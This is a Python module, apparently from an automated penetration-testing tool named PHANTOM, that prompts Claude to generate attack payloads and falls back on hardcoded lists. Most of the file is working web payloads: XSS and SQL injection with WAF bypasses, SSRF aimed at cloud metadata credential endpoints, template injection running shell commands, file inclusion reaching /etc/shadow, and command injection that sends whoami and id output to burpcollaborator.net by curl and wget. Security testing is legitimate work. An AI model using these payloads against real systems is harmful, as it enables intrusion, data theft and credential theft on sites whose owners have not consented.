"""
LLM Engine — Claude API interface.

Priority order:
1. Claude API (Anthropic) — best quality, requires API key
2. Fallback — hardcoded rules when no LLM available

Set ANTHROPIC_API_KEY in .env to enable Claude.
"""
import json
import logging
import re

import httpx
from app.config import get_settings

settings = get_settings()
logger = logging.getLogger(__name__)

SYSTEM_PROMPT = """You are PHANTOM, an expert autonomous penetration testing AI.
You analyze web applications for security vulnerabilities.
You are precise, methodical, and always respond in structured JSON when requested.
You have deep knowledge of OWASP Top 10, CVEs, exploit techniques, WAF bypass methods, and payload crafting.
Always think step by step and provide actionable recommendations.
IMPORTANT: When asked for JSON, respond ONLY with valid JSON. No markdown, no explanation, no code fences."""


class LLMEngine:
    def __init__(self):
        from app.ai.get_claude_key import get_claude_api_key
        self.claude_api_key = get_claude_api_key() or settings.anthropic_api_key
        self.claude_model = settings.claude_model
        self.client = httpx.AsyncClient(timeout=180.0)
        self._provider = None  # "claude" or None

    @property
    def provider(self) -> str:
        """Current active provider name."""
        return self._provider or "none"

    async def _detect_provider(self) -> str | None:
        """Detect if Claude API is available."""
        if self._provider is not None:
            return self._provider

        if (self.claude_api_key
                and len(self.claude_api_key) > 10
                and not self.claude_api_key.startswith("your_")):
            try:
                resp = await self.client.post(
                    "https://api.anthropic.com/v1/messages",
                    headers={
                        "x-api-key": self.claude_api_key,
                        "anthropic-version": "2023-06-01",
                        "content-type": "application/json",
                    },
                    json={
                        "model": self.claude_model,
                        "max_tokens": 1,
                        "messages": [{"role": "user", "content": "hi"}],
                    },
                    timeout=10.0,
                )
                if resp.status_code in (200, 400, 429):
                    self._provider = "claude"
                    logger.info("LLM provider: Claude API")
                    return self._provider
                elif resp.status_code == 401:
                    logger.warning("Claude API key is invalid (401)")
            except Exception:
                pass

        self._provider = None
        logger.warning("No LLM provider available (set ANTHROPIC_API_KEY)")
        return None

    async def is_available(self) -> bool:
        """Check if any LLM provider is available."""
        provider = await self._detect_provider()
        return provider is not None

    async def analyze(self, prompt: str, temperature: float = 0.3) -> str:
        """Send prompt to Claude API."""
        provider = await self._detect_provider()

        if provider == "claude":
            return await self._call_claude(prompt, temperature)
        else:
            raise LLMError("No LLM provider available (set ANTHROPIC_API_KEY)")

    async def _call_claude(self, prompt: str, temperature: float) -> str:
        """Call Claude API."""
        try:
            response = await self.client.post(
                "https://api.anthropic.com/v1/messages",
                headers={
                    "x-api-key": self.claude_api_key,
                    "anthropic-version": "2023-06-01",
                    "content-type": "application/json",
                },
                json={
                    "model": self.claude_model,
                    "max_tokens": 4096,
                    "temperature": temperature,
                    "system": SYSTEM_PROMPT,
                    "messages": [{"role": "user", "content": prompt}],
                },
            )
            response.raise_for_status()
            data = response.json()
            content = data.get("content", [])
            if content:
                return content[0].get("text", "")
            return ""
        except httpx.TimeoutException:
            raise LLMError("Claude API request timed out (180s)")
        except httpx.HTTPStatusError as e:
            if e.response.status_code in (429, 401, 503):
                raise LLMError(f"Claude API error: {e.response.status_code}")
            raise LLMError(f"Claude API error: {e.response.status_code} {e.response.text[:200]}")
        except Exception as e:
            raise LLMError(f"Claude API error: {str(e)}")

    async def analyze_json(self, prompt: str, temperature: float = 0.2) -> dict:
        """Send prompt and parse JSON response. Retries once on parse failure."""
        result = await self.analyze(prompt, temperature)
        parsed = self._extract_json(result)
        if parsed is not None:
            return parsed

        # Retry with stricter instruction
        retry_prompt = (
            prompt + "\n\nIMPORTANT: Respond with ONLY valid JSON. "
            "No markdown code fences, no explanation text."
        )
        result = await self.analyze(retry_prompt, temperature=0.1)
        parsed = self._extract_json(result)
        if parsed is not None:
            return parsed

        raise LLMError(f"Failed to parse JSON from LLM response: {result[:200]}")

    def _extract_json(self, text: str) -> dict | list | None:
        """Extract JSON from LLM response, handling code fences and extra text."""
        text = text.strip()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            pass

        # Try extracting from code fences
        if "```" in text:
            match = re.search(r"```(?:json)?\s*\n?(.*?)```", text, re.DOTALL)
            if match:
                try:
                    return json.loads(match.group(1).strip())
                except json.JSONDecodeError:
                    pass

        # Try finding JSON object/array in text
        for pattern in [r'\{[\s\S]*\}', r'\[[\s\S]*\]']:
            match = re.search(pattern, text)
            if match:
                try:
                    return json.loads(match.group(0))
                except json.JSONDecodeError:
                    continue

        return None

    async def generate_payloads(self, vuln_type: str, context: dict) -> list[str]:
        """Generate attack payloads for a specific vulnerability type."""
        prompt = f"""Generate 15 advanced {vuln_type} payloads for penetration testing.

Context:
- Technology: {context.get('technology', 'unknown')}
- WAF: {context.get('waf', 'none')}
- Parameter type: {context.get('param_type', 'string')}
- Injection point: {context.get('injection_point', 'parameter')}

Requirements:
- Mix of basic detection payloads and advanced exploitation payloads
- Include WAF bypass variants if WAF is present
- Include encoding variations
- Prioritize payloads most likely to succeed against the detected technology

Respond as a JSON array of strings. ONLY the JSON array, nothing else.
Example: ["payload1", "payload2"]"""

        try:
            result = await self.analyze(prompt)
            parsed = self._extract_json(result)
            if isinstance(parsed, list) and len(parsed) > 0:
                return [str(p) for p in parsed]
        except LLMError:
            pass

        return self._fallback_payloads(vuln_type)

    def _fallback_payloads(self, vuln_type: str) -> list[str]:
        """Hardcoded fallback payloads — battle-tested for real-world targets."""
        payloads = {
            "xss": [
                # Basic vectors
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                # WAF bypass: tag/event obfuscation
                '<img src=x onerror=alert`1`>',
                '<svg/onload=alert(1)>',
                '<dETAILS/oPEN/oNTOGGLE=alert(1)>',
                '<body onpageshow=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                # WAF bypass: encoding tricks
                '<img src=x onerror=\u0061lert(1)>',  # unicode escape
                '<img src=x onerror=&#97;lert(1)>',    # HTML entity
                '<svg onload=al\x65rt(1)>',            # hex escape
                '"><img/src=`x`onerror=alert(1)>',     # backtick
                '<svg onload=top["al"+"ert"](1)>',     # string concat
                '<svg onload=window["alert"](1)>',     # bracket notation
                '<svg onload=self[`alert`](1)>',       # template literal
                # DOM XSS
                'javascript:alert(1)',
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(alert(1))//',
                '{{constructor.constructor("alert(1)")()}}',
                # Double encoding
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
                # Polyglot XSS
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</plaiNtext/</xmp><svg/onload=alert(1)>',
            ],
            "sqli": [
                # Classic
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "admin'--",
                # Time-based blind
                "1' AND SLEEP(5)--",
                "1' AND (SELECT SLEEP(5))--",
                "1';WAITFOR DELAY '0:0:5'--",       # MSSQL
                "1' AND pg_sleep(5)--",              # PostgreSQL
                "1' AND DBMS_LOCK.SLEEP(5)--",       # Oracle
                # Error-based
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
                "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                # UNION-based column discovery
                "1' ORDER BY 1--",
                "1' ORDER BY 5--",
                "1' ORDER BY 10--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                # WAF bypass
                "1'/*!50000OR*/1=1--",               # MySQL version comment
                "1' oR '1'='1",                      # case variation
                "1'%09OR%091=1--",                    # tab instead of space
                "1'/**/OR/**/1=1--",                  # comment as space
                "1'%0aOR%0a1=1--",                   # newline as space
                "-1' UNION ALL SELECT NULL--",
                # Boolean-based blind
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' AND SUBSTRING(@@version,1,1)='5'--",
                # Stacked queries
                "1'; SELECT SLEEP(5)--",
                # NoSQL (MongoDB)
                '{"$gt":""}',
                '{"$ne":"invalid"}',
            ],
            "ssrf": [
                # Cloud metadata (AWS, GCP, Azure, DO)
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",           # DigitalOcean
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
                # Localhost bypass
                "http://127.0.0.1",
                "http://localhost",
                "http://[::1]",
                "http://0x7f000001",
                "http://0177.0.0.1",
                "http://2130706433",
                "http://127.1",
                "http://0",
                "http://0.0.0.0",
                # DNS rebinding
                "http://localtest.me",
                "http://spoofed.burpcollaborator.net",
                # Protocol smuggling
                "file:///etc/passwd",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:6379/_INFO%0d%0a",
                # URL parser confusion
                "http://evil.com@127.0.0.1",
                "http://127.0.0.1#@evil.com",
                "http://127.0.0.1%2523@evil.com",
                # Internal network scan
                "http://10.0.0.1",
                "http://172.16.0.1",
                "http://192.168.1.1",
            ],
            "ssti": [
                # Detection polyglot
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{7*7}",
                # Jinja2 / Python
                "{{config}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{self.__init__.__globals__}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{lipsum.__globals__['os'].popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                # Twig / PHP
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                # Java / Spring
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${T(java.lang.System).getenv()}",
                # FreeMarker
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                # ERB / Ruby
                "<%= system('id') %>",
                "<%= `id` %>",
                # Pebble
                '{% set cmd = "id" %}{% set out = cmd.getClass().forName("java.lang.Runtime").getMethod("exec",cmd.getClass()).invoke(cmd.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),cmd) %}',
            ],
            "lfi": [
                # Basic traversal
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                # Double encoding
                "%2e%2e/%2e%2e/etc/passwd",
                "%252e%252e%252fetc%252fpasswd",
                # Null byte (PHP < 5.3)
                "/etc/passwd%00",
                "/etc/passwd%00.jpg",
                # Dot-dot slash variations
                "....//....//etc/passwd",
                "..%c0%af..%c0%afetc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                # Windows
                "..\\..\\windows\\win.ini",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                # PHP wrappers (critical for RCE escalation)
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=convert.base64-encode/resource=../config.php",
                "php://filter/convert.base64-encode/resource=wp-config.php",
                "php://input",
                "expect://id",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
                # Interesting files
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "....//....//....//etc/shadow",
            ],
            "cmd_injection": [
                # Basic
                "; id",
                "| id",
                "$(id)",
                "`id`",
                "|| id",
                "&& id",
                # Newline injection
                "%0aid",
                "%0a%0did",
                "\nid",
                # WAF bypass: IFS (Internal Field Separator)
                ";$IFS'id'",
                ";{id}",
                ";id${IFS}",
                # WAF bypass: quotes and encoding
                "';id;'",
                '";id;"',
                "$(echo id | base64 -d | sh)",
                # Blind — DNS/HTTP callback
                "; curl http://burpcollaborator.net/$(whoami)",
                "; wget http://burpcollaborator.net/?$(id|base64)",
                "; ping -c 1 $(whoami).burpcollaborator.net",
                # Time-based blind
                "; sleep 5",
                "| sleep 5",
                "$(sleep 5)",
                "& ping -c 5 127.0.0.1 &",
                # Chained extraction
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "$(cat /etc/passwd)",
                # Windows
                "& dir",
                "| type C:\\Windows\\win.ini",
                "& ping -n 5 127.0.0.1",
            ],
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
                "/\\evil.com",
                "//evil.com/%2f..",
                "////evil.com",
                "https:evil.com",
                "//evil%00.com",
                "/redirect?url=https://evil.com",
                "//evil.com?@legitimate.com",
                "https://evil.com#@legitimate.com",
                # Advanced
                "/%09/evil.com",
                "/%5Cevil.com",
                "/evil.com%2F%2F",
                "/.evil.com",
                "///evil.com",
                "///\\;@evil.com",
            ],
            "idor": [
                "1", "0", "-1", "999999", "admin",
                "../1", "null", "undefined",
                # UUID guessing
                "00000000-0000-0000-0000-000000000000",
                "00000000-0000-0000-0000-000000000001",
                # Method tampering
                "1;DELETE FROM users",
                # Parameter pollution
                "1&admin=true",
                "1&role=admin",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
            ],
        }
        return payloads.get(vuln_type, payloads.get("xss", []))

    async def close(self):
        await self.client.aclose()


class LLMError(Exception):
    pass
